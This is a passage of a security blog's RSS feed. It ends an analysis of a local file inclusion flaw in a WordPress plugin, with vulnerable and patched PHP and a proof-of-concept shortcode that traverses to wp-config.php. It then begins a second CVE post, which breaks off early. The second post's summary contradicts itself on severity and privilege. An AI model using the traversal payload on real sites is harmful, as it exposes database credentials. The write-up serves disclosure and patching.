example:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$form_template = &amp;#39;../../../../../../../wp-config&amp;#39;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Patched version&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;div class=&amp;#34;stdl-form-wrap stdl-&amp;lt;?php echo esc_attr($form_template); ?&amp;gt; stdl-alias&amp;gt;&amp;#34;&amp;gt;&#xA;    &amp;lt;form method=&amp;#34;post&amp;#34; action=&amp;#34;&amp;#34; class=&amp;#34;stdl-subscription-form&amp;#34; data-form-alias=&amp;#34;stdl&amp;#34;&amp;gt;&#xA;&#xA;        &amp;lt;?php&#xA;        do_action(&amp;#39;stdl_before_form&amp;#39;, $form_details);&#xA;&#xA;        $base_dir = realpath(STDL_PATH . &amp;#39;inc/views/frontend/form-templates&amp;#39;) . DIRECTORY_SEPARATOR;&#xA;        $sanitized_template = basename($form_template) . &amp;#39;.php&amp;#39;;&#xA;        $file_path = realpath($base_dir . $sanitized_template);&#xA;&#xA;        if ($file_path &amp;amp;&amp;amp; strpos($file_path, $base_dir) === 0 &amp;amp;&amp;amp; file_exists($file_path)) {&#xA;            include($file_path);&#xA;        }&#xA;        do_action(&amp;#39;stdl_after_form&amp;#39;, $form_details);&#xA;        ?&amp;gt;&#xA;    &amp;lt;/form&amp;gt;&#xA;&amp;lt;/div&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The patch uses &lt;a href=&#34;https://www.php.net/manual/en/function.basename.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;basename()&lt;/code&gt;&lt;/a&gt; to extract the file name portion of &lt;code&gt;$form_template&lt;/code&gt;, removing traversal sequences &lt;code&gt;../&lt;/code&gt;, for example:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;../../../../../../payload.pdf -&amp;gt; payload.pdf&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Then it concatenates into &lt;code&gt;$base_dir&lt;/code&gt; and resolves the absolute path with &lt;a href=&#34;https://www.php.net/manual/en/function.realpath.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;realpath&lt;/code&gt;&lt;/a&gt; before &lt;code&gt;include()&lt;/code&gt; =&amp;gt; effectively eliminates the &lt;strong&gt;LFI&lt;/strong&gt; possibility.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;The vulnerable &lt;code&gt;form-template.php&lt;/code&gt; shown above is invoked from &lt;code&gt;stdl-shortcode.php&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php&#xA;$form_template = (!empty($atts[&amp;#39;template&amp;#39;])) ? $atts[&amp;#39;template&amp;#39;] : $form_details[&amp;#39;layout&amp;#39;][&amp;#39;template&amp;#39;];&#xA;if (isset($_COOKIE[&amp;#39;stdl_encryption_key&amp;#39;]) &amp;amp;&amp;amp; $this-&amp;gt;check_if_already_subscribed($_COOKIE[&amp;#39;stdl_encryption_key&amp;#39;]) &amp;amp;&amp;amp; empty($form_details[&amp;#39;general&amp;#39;][&amp;#39;always_show&amp;#39;])) {&#xA;    // other logic&#xA;} else {&#xA;    // other logic&#xA;    if ($display_type == &amp;#39;direct&amp;#39;) {&#xA;        include(STDL_PATH . &amp;#39;inc/views/frontend/form-template.php&amp;#39;);&#xA;    } else {&#xA;        ?&amp;gt;&#xA;        &amp;lt;div class=&amp;#34;stdl-popup-outerwrap &amp;lt;?php echo esc_attr($popup_alias_class); ?&amp;gt;&amp;#34;&amp;gt;&#xA;            &amp;lt;input type=&amp;#34;button&amp;#34; class=&amp;#34;stdl-popup-trigger stdl-popup-&amp;lt;?php echo esc_attr($form_template); ?&amp;gt;&amp;#34; value=&amp;#34;&amp;lt;?php echo esc_attr($popup_trigger_text); ?&amp;gt;&amp;#34;&amp;gt;&#xA;            &amp;lt;div class=&amp;#34;stdl-popup-innerwrap&amp;#34; style=&amp;#34;display:none;&amp;#34;&amp;gt;&#xA;                &amp;lt;div class=&amp;#34;stdl-overlay stdl-popup-wrapper&amp;#34;&amp;gt;&#xA;&#xA;                    &amp;lt;div class=&amp;#34;stdl-popup-contetn-wrap&amp;#34;&amp;gt;&#xA;                        &amp;lt;a href=&amp;#34;javascript:void(0)&amp;#34; class=&amp;#34;stdl-popup-close&amp;#34;&amp;gt;&amp;lt;i class=&amp;#34;fas fa-times&amp;#34;&amp;gt;&amp;lt;/i&amp;gt;&amp;lt;/a&amp;gt;&#xA;                            &amp;lt;?php include(STDL_PATH . &amp;#39;inc/views/frontend/form-template.php&amp;#39;);&#xA;                            ?&amp;gt;&#xA;                    &amp;lt;/div&amp;gt;&#xA;                &amp;lt;/div&amp;gt;&#xA;            &amp;lt;/div&amp;gt;&#xA;        &amp;lt;/div&amp;gt;&#xA;        &amp;lt;?php&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;$form_template&lt;/code&gt; is the value of &lt;code&gt;$atts[&#39;template&#39;]&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;From CVE analysis experience on WordPress plugins, &lt;code&gt;$atts&lt;/code&gt; is typically the shortcode attributes array, for example:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;[pornhub id=69]&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Note that &lt;code&gt;form-template.php&lt;/code&gt; &lt;strong&gt;is always included&lt;/strong&gt; within the inner &lt;code&gt;if-else&lt;/code&gt; block inside the outer &lt;code&gt;else&lt;/code&gt; when the &lt;code&gt;stdl_encryption_key&lt;/code&gt; cookie does not exist (i.e., the user has not subscribed or does not have a valid encryption key).&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;stdl-shortcode.php&lt;/code&gt; is included by the shortcode callback &lt;code&gt;subscribe_to_download_form&lt;/code&gt; with &lt;code&gt;atts&lt;/code&gt; being the shortcode attributes array.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function __construct() {&#xA;    add_shortcode(&amp;#39;subscribe_to_download_form&amp;#39;, array($this, &amp;#39;generate_shortcode_output&amp;#39;));&#xA;}&#xA;&#xA;function generate_shortcode_output($atts) {&#xA;    wp_enqueue_style(&amp;#39;stdl-frontend-custom&amp;#39;, STDL_CSS_DIR . &amp;#39;/stdl-custom.css&amp;#39;, array(), STDL_VERSION);&#xA;    ob_start();&#xA;    include(STDL_PATH . &amp;#39;inc/views/frontend/stdl-shortcode.php&amp;#39;);&#xA;    $form_html = ob_get_contents();&#xA;    ob_clean();&#xA;    return $form_html;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;step-1&#34;&gt;&lt;span&gt;Step 1&lt;/span&gt;&#xA;  &lt;a href=&#34;#step-1&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;Log in to WordPress with a Contributor account (lowest privilege that can create posts).&lt;/p&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;step-2&#34;&gt;&lt;span&gt;Step 2&lt;/span&gt;&#xA;  &lt;a href=&#34;#step-2&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;Create a post with the shortcode&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;[subscribe_to_download_form template=&amp;#39;../../../../../../../wp-config&amp;#39;]&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;The debugger reached &lt;code&gt;wp-config.php&lt;/code&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-16-cve-2025-30782/result.png&#34;&#xA;    alt=&#34;Successful LFI result&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Successful LFI result&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Version &lt;strong&gt;≤ 1.2.9&lt;/strong&gt; of Subscribe to Download Lite allows LFI because &lt;code&gt;include()&lt;/code&gt; uses an unvalidated &lt;code&gt;$atts[&#39;template&#39;]&lt;/code&gt;; the issue was fixed in &lt;strong&gt;1.3.0&lt;/strong&gt; by normalizing and restricting the template name (&lt;code&gt;basename()&lt;/code&gt; + &lt;code&gt;realpath()&lt;/code&gt; + &lt;code&gt;base_dir&lt;/code&gt; check) before &lt;code&gt;include()&lt;/code&gt;. Update immediately.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Shortcode input is untrusted — do not include directly.&lt;/li&gt;&#xA;&lt;li&gt;Patch (v1.3.0) uses &lt;code&gt;basename()&lt;/code&gt; + &lt;code&gt;realpath()&lt;/code&gt; + compare with allowed directory.&lt;/li&gt;&#xA;&lt;li&gt;Actions: update the plugin, whitelist/validate attributes.&lt;/li&gt;&#xA;&lt;li&gt;Monitor logs for &lt;code&gt;../&lt;/code&gt; in template parameters.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html?highlight=lfi#lfi--rfi-using-php-wrappers--protocols&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;File Inclusion/Path traversal — Hacktrick&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/subscribe-to-download-lite/vulnerability/wordpress-subscribe-to-download-lite-plugin-1-2-9-local-file-inclusion-vulnerability?_s_id=cve&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress Subscribe to Download Lite Plugin &amp;lt;= 1.2.9 is vulnerable to Local File Inclusion &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-30868 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-10-15-cve-2025-30868/</link>
      <pubDate>Wed, 15 Oct 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-10-15-cve-2025-30868/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-15-cve-2025-30868/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;Team Manager&lt;/strong&gt; plugin version &lt;strong&gt;≤ 2.1.23&lt;/strong&gt; contains a &lt;strong&gt;Local File Inclusion&lt;/strong&gt; vulnerability that allows an unauthenticated attacker to control the file parameter used in &lt;code&gt;include/require&lt;/code&gt;, enabling inclusion or reading of local files on the server (e.g., configuration files containing credentials), leading to leakage of sensitive information and, in some server configurations, possible code execution.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-30868&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-30868&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Local File Inclusion&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2.1.23&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.2.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (7.5)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/wp-team-manager/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Team Manager Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;Team Manager&lt;/strong&gt;: &lt;strong&gt;2.1.23&lt;/strong&gt; (vulnerable) and &lt;strong&gt;2.2.0&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool to compare differences between versions.&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://wordpress.org/plugins/elementor/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Elementor plugin&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  